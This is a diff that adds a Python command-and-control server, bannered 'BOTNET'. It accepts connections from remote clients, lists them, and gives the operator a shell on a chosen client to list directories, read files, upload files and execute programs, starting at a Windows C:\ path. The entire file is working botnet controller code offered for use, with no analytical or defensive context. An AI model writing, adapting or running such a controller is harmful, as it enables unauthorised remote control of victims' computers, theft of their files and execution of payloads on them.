@@ -1,0 +1,157 @@
+import socket
+import threading
+import json
+import binascii
+import os
+import time
+
+
+print(f"______  _____ _____ _   _  _____ _____") 
+print(f"| ___ \|  _  |_   _| \ | ||  ___|_   _|")
+print(f"| |_/ /| | | | | | |  \| || |__   | |  ")
+print(f"| ___ \| | | | | | | . ` ||  __|  | | ")
+print(f"| |_/ /\ \_/ / | | | |\  || |___  | |  ")
+print(f"\____/  \___/  \_/ \_| \_/\____/  \_/")
+
+
+
+
+
+time.sleep(3)
+clients = []
+client_lock = threading.Lock()
+
+def print_entries(entries):
+    for e in entries:
+        t = "<DIR>" if e["is_dir"] else "<FILE>"
+        print(f"{t:<6} {e['name']}")
+
+def handle_client(conn, addr):
+    with client_lock:
+        clients.append((conn, addr))
+    print(f"[+] New client from {addr}")
+
+    try:
+        while True:
+            data = conn.recv(10_000_000)
+            if not data:
+                break
+            response = json.loads(data.decode())
+            print(f"[+] Response from {addr}: {response}")
+    except Exception as e:
+        print(f"[!] Client {addr} disconnected ({e})")
+    finally:
+        with client_lock:
+            clients.remove((conn, addr))
+        conn.close()
+
+def broadcast_command(command_json, targets):
+    for idx in targets:
+        if 0 <= idx < len(clients):
+            conn, addr = clients[idx]
+            try:
+                conn.send(json.dumps(command_json).encode())
+                print(f"[+] Sent to client {addr}")
+            except Exception as e:
+                print(f"[!] Failed to send to {addr}: {e}")
+
+def list_clients():
+    with client_lock:
+        for idx, (conn, addr) in enumerate(clients):
+            print(f"[{idx}] {addr}")
+
+def main():
+    host = "0.0.0.0"
+    port = 9000
+    server = socket.socket()
+    server.bind((host, port))
+    server.listen(5)
+    print(f"[+] Server listening on {port}...")
+
+    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
+
+    while True:
+        try:
+            cmd = input("\nCommand> ").strip()
+            if cmd == "list":
+                list_clients()
+            elif cmd.startswith("select "):
+                try:
+                    idx = int(cmd.split()[1])
+                    if 0 <= idx < len(clients):
+                        client_shell(idx)
+                    else:
+                        print("Invalid client index.")
+                except:
+                    print("Usage: select <index>")
+            elif cmd == "exit":
+                break
+            else:
+                print("Commands: list, select <index>, exit")
+        except KeyboardInterrupt:
+            break
+
+    server.close()
+
+def accept_clients(server):
+    while True:
+        conn, addr = server.accept()
+        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
+
+def client_shell(idx):
+    conn, addr = clients[idx]
+    current_path = "C:\\"
+
+    while True:
+        print(f"\n{addr} | Current path: {current_path}")
+        cmd = input("Enter command (ls/cd/read/upload/exec/exit): ").strip()
+
+        if cmd == "exit":
+            break
+        elif cmd == "ls":
+            request = {"command": "list", "path": current_path}
+        elif cmd.startswith("cd "):
+            arg = cmd[3:].strip()
+            current_path = os.path.join(current_path, arg) if arg != ".." else os.path.dirname(current_path)
+            continue
+        elif cmd.startswith("read "):
+            file_path = os.path.join(current_path, cmd[5:].strip())
+            request = {"command": "read", "path": file_path}
+        elif cmd.startswith("upload "):
+            local_file = cmd[7:].strip()
+            filename = os.path.basename(local_file)
+            remote_path = os.path.join(current_path, filename)
+            with open(local_file, "rb") as f:
+                data = binascii.hexlify(f.read()).decode()
+            request = {"command": "upload", "path": remote_path, "data": data}
+        elif cmd.startswith("exec "):
+            remote_path = os.path.join(current_path, cmd[5:].strip())
+            request = {"command": "exec", "path": remote_path}
+        else:
+            print("Unknown command.")
+            continue
+
+        try:
+            conn.send(json.dumps(request).encode())
+            data = conn.recv(10_000_000)
+            response = json.loads(data.decode())
+
+            if response.get("status") == "ok":
+                if "entries" in response:
+                    print_entries(response["entries"])
+                elif "data" in response:
+                    content = binascii.unhexlify(response["data"])
+                    try:
+                        print(content.decode())
+                    except:
+                        print("Binary file:", content[:100])
+                else:
+                    print("Success:", response.get("message"))
+            else:
+                print("Error:", response.get("message"))
+        except Exception as e:
+            print("[!] Connection lost:", e)
+            break
+
+if __name__ == "__main__":
+    main()
